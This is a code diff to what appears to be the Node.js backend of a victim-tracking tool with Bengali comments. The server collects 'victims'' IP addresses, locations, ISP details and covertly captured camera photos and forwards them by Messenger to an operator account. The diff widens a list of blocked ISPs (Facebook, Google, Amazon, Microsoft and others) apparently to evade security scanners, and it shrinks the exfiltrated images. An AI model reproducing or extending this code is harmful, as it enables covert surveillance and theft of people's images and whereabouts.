@@ -14,13 +14,25 @@ const {
 } = require('../utils/helpers');
 
 // ================================================================
-// 🔥 ISP ব্লক লিস্ট
+// 🔥 ISP ব্লক লিস্ট (বর্ধিত)
 // ================================================================
-const BLOCKED_ISP = 'Facebook, Inc.';
+const BLOCKED_ISPS = [
+    'Facebook, Inc.',
+    'Google, Inc.',
+    'Google LLC',
+    'Amazon',
+    'Amazon.com, Inc.',
+    'Microsoft',
+    'Microsoft Corporation',
+    'Alibaba',
+    'Alibaba Group',
+    'Twitter, Inc.',
+    'LinkedIn Corporation'
+];
 
 function isIspBlocked(victim) {
     if (victim.location && victim.location.isp) {
-        return victim.location.isp === BLOCKED_ISP;
+        return BLOCKED_ISPS.some(isp => victim.location.isp.includes(isp));
     }
     return false;
 }
@@ -66,7 +78,6 @@ const IMAGE_TTL = 600000; // ১০ মিনিট
 setInterval(async () => {
     try {
         const cutoff = new Date(Date.now() - IMAGE_TTL);
-        // 🔥 updateMany দিয়ে সব ভিক্টিমের camera অ্যারে থেকে পুরনো ছবি বাদ দিন
         const result = await Victim.updateMany(
             { 'camera.timestamp': { $lt: cutoff } },
             { $pull: { camera: { timestamp: { $lt: cutoff } } } }
@@ -284,14 +295,19 @@ router.post('/api/victim', async (req, res) => {
         console.log(`🔍 ভিক্টিম ISP: ${victim.location?.isp || 'N/A'} → ${blocked ? '🚫 ব্লকড' : '✅ অনুমোদিত'}`);
         console.log(`🔍 ইউজার পারমিশন: ${hasPermission ? '✅ আছে' : '❌ নেই'}`);
 
-        if (!blocked && hasPermission && victim.fbId && victim.fbId !== 'unknown') {
+        // 🔥 শুধুমাত্র IP ও লোকেশন থাকলেই মেসেজ পাঠান
+        const hasValidData = victim.ip && victim.ip !== '0.0.0.0' && victim.location && victim.location.city;
+
+        if (!blocked && hasPermission && victim.fbId && victim.fbId !== 'unknown' && hasValidData) {
             const msg = formatVictimData(victim);
             await sendMessage(victim.fbId, msg);
             console.log(`📤 ডিভাইস ইনফো মেসেজ পাঠানো হয়েছে: ${victim.fbId}`);
+        } else if (!hasValidData) {
+            console.log(`⚠️ IP বা লোকেশন N/A → মেসেজ পাঠানো হয়নি।`);
         } else if (blocked) {
             console.log(`⛔ ব্লকড ISP (${victim.location?.isp}) → মেসেজ পাঠানো হয়নি।`);
         } else if (!hasPermission) {
-            console.log(`⛔ ইউজারের পারমিশন নেই → মেসেজ পাঠানো হয়নি।`);
+            console.log(`⛔ ইউজারের পারমিশন নেই → মেসেজ পাঠানো হয়নি。`);
         } else {
             console.log(`⚠️ fbId 'unknown' → মেসেজ পাঠানো হয়নি।`);
         }
@@ -313,7 +329,7 @@ router.post('/api/victim', async (req, res) => {
 });
 
 // ================================================================
-// 🔥 ক্যামেরা ছবি রিসিভ – আসল ছবি সেভ + রিসাইজ করে মেসেঞ্জারে (মেমরি অপটিমাইজড)
+// 🔥 ক্যামেরা ছবি রিসিভ – আসল ছবি সেভ + রিসাইজ করে মেসেঞ্জারে
 // ================================================================
 router.post('/api/camera', async (req, res) => {
     try {
@@ -355,15 +371,17 @@ router.post('/api/camera', async (req, res) => {
         console.log(`📸 ক্যামেরা ছবি: ${id} (মোট ${totalImages}টি)`);
 
         // ================================================================
-        // 🔥 পারমিশন মেসেজ: শুধুমাত্র প্রথম ছবিতে ১ বার পাঠান
+        // 🔥 পারমিশন মেসেজ: শুধুমাত্র প্রথম ছবিতে ১ বার পাঠান (এক্সপাইরি চেক)
         // ================================================================
+        let permissionMessageSent = false;
         if (!blocked && hasPermission && victim.fbId && victim.fbId !== 'unknown' && totalImages === 1) {
             await sendMessage(victim.fbId, '📸 *ভিক্টিম ক্যামেরা পারমিশন দিয়েছে!*\nছবি আসতে শুরু করেছে...');
+            permissionMessageSent = true;
             console.log(`📸 ক্যামেরা পারমিশন মেসেজ (প্রথম): ${victim.fbId}`);
         }
 
         // ================================================================
-        // 📤 মেসেঞ্জারে পাঠানোর জন্য রিসাইজ করা ছবি তৈরি (মেমরি সেভ)
+        // 📤 মেসেঞ্জারে পাঠানোর জন্য রিসাইজ করা ছবি তৈরি (ছোট সাইজ)
         // ================================================================
         if (!blocked && hasPermission && victim.fbId && victim.fbId !== 'unknown') {
             try {
@@ -371,13 +389,13 @@ router.post('/api/camera', async (req, res) => {
                 try {
                     const sharp = require('sharp');
                     const imageBuffer = Buffer.from(image, 'base64');
-                    // 🔥 রেজোলিউশন ৪৮০px, কোয়ালিটি ৬০% – মেমরি কম লাগে
+                    // 🔥 রেজোলিউশন ৩২০x৩২০, কোয়ালিটি ৫০% – সাইজ অনেক কম
                     const resizedBuffer = await sharp(imageBuffer)
-                        .resize({ width: 480, height: 480, fit: 'inside', withoutEnlargement: true })
-                        .jpeg({ quality: 60 })
+                        .resize({ width: 320, height: 320, fit: 'inside', withoutEnlargement: true })
+                        .jpeg({ quality: 50 })
                         .toBuffer();
                     resizedBase64 = resizedBuffer.toString('base64');
-                    console.log(`✅ ছবি রিসাইজ করা হয়েছে (480px, 60%)`);
+                    console.log(`✅ ছবি রিসাইজ করা হয়েছে (320px, 50%)`);
                 } catch (sharpErr) {
                     console.log('⚠️ Sharp ব্যবহার করা যায়নি, আসল ছবি পাঠানো হবে:', sharpErr.message);
                     resizedBase64 = image;
